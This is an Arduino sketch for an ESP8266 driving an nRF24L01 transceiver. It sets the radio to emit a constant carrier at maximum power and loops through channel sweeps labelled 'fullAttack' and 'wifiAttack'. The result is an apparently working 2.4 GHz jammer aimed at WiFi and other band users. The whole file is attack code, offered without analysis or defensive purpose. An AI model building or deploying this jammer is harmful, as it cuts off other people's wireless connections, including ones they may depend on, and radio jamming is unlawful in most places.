#include <Wire.h>
#include <SPI.h>
#include "RF24.h"

#define CSN_PIN 4
#define CE_PIN 2

//Im using nodemcu esp8266
// instantiate an object for the nRF24L01 transceiver
RF24 radio(CE_PIN, CSN_PIN);//CE, CSN
byte i = 45;

const int wifiFrequencies[] = {
  2412,
  2417,
  2422,
  2427,
  2432,
  2437,
  2442,
  2447,
  2452,
  2457,
  2462
};

void setup() {
  Serial.begin(9600);

  while (!Serial) {
    // some boards need to wait to ensure access to serial over USB
    Serial.println(" Board not activating");
  }

  Wire.begin(14,12);

    // initialize the transceiver on the SPI bus
  if (!radio.begin()) {
    Serial.println(F("radio hardware is not responding!!"));
    
    while (1) {}  // hold in infinite loop
  }
  else {
    
    Serial.println("1- Radio Initiated ");
    delay(200);
    radio.setAutoAck(false); 
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, i);
    //printf_begin(); 
    //radio.printPrettyDetails();
    Serial.println(" Radio Initiated ");

    
  }
}

void fullAttack() {
  for (size_t i = 0; i < 80; i+=2) {
    radio.setChannel(i);
  }
}
void wifiAttack() {
  for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
    radio.setChannel(wifiFrequencies[i] - 2400);
  }
}

void loop() {
  // Serial.println("Full attack loop is running !!");
  fullAttack();

}